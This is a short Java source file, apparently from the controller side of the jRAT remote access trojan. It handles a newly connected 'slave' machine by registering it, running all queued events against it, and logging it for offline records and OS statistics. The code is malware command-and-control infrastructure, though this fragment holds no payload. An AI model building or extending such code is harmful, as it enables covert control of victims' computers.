package jrat.controller.packets.incoming;

import jrat.controller.OfflineSlave;
import jrat.controller.Slave;
import jrat.controller.events.Event;
import jrat.controller.events.Events;
import jrat.controller.net.ConnectionHandler;
import jrat.controller.settings.StatisticsOperatingSystem;
import jrat.controller.settings.StoreOfflineSlaves;

import java.io.DataInputStream;

public class Packet3Initialized extends AbstractIncomingPacket {

	@Override
	public void read(final Slave slave, DataInputStream dis) throws Exception {
		ConnectionHandler.addSlave(slave);

		for (Event event : Events.queue.values()) {
			event.perform(slave);
		}

		StoreOfflineSlaves.getGlobal().add(new OfflineSlave(slave));
		StatisticsOperatingSystem.getGlobal().add(slave);
	}

}
